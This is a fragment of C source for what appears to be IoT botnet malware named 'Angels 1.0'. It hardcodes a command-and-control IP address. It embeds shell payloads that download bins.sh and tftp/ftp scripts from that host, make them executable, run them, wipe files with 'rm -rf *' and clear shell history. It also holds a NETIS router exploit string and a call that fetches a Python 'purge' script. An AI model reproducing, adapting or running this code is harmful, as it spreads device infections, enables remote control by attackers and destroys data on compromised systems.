...
#define VERSION "Angels 1.0"
#define NETIS "AA\x00\x00AAAA"
unsigned char *hekkertelnet[] = { "185.58.193.68" };
...
char *hvgsgd = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.58.193.68/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 185.58.193.68  -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 185.58.193.68 ; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf bins.sh tftp1.sh tftp2.sh; rm -rf *;history -c\r\n";
int initConnection();
int userID = 1;
...
sprintf(payload2, "%s cd /var/; rm -rf tftp; wget http://185.58.193.68 /tftp || tftp -r tftp -g 185.58.193.68 ; chmod 777 tftp; ./tftp; rm -rf tftp\x00", NETIS);
...
int i;
for(i = 0; i < 9; i++){
system("cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.58.193.68 /bins.sh ; chmod 777 bins.sh; sh bins.sh; tftp 185.58.193.68  -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 185.58.193.68 ; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 185.58.193.68  ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh;rm -rf *;history -c\r\n");
}
sleep(5);
}
//botkill
...
{
system("yum install python-paramiko -y;apt-get install python-paramiko -y;mkdir /.tmp;cd /.tmp;wget http://185.58.193.68 /purge.py");
...
HackerPrint(D1ckSucka, "\x1b[1;31mConnected |  \x1b[1;34m IP: %s | \x1b[1;32m Type: %s | \x1b[1;96m Version: %s", inet_ntoa(ourIP), getBuild(), VERSION);
char commBuf[4096];
int got = 0;
int i = 0;
